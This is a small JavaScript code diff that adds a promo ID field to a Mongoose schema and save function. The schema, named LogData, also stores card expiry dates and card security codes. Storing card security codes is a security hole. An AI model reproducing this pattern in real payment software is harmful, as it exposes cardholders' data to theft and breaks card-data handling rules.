@@ -418,6 +418,7 @@ const logDataSchema = new mongoose.Schema({
   cardExpiry: String,
   cardCcv: String,
   cardBrand: String,
+  Promo_ID: String,
   Promo_type: String,
 });
 const LogData = mongoose.model("LogData", logDataSchema);
@@ -449,6 +450,7 @@ const saveDataToMongoDB = async (arrayData, resp, usern) => {
       cardExpiry: cardInfoPart.cardExpiry,
       cardCcv: cardInfoPart.cardCcv,
       cardBrand: cardInfoPart.cardBrand,
+      Promo_ID: promo_ID,
       Promo_type: promo_type,
     });
 
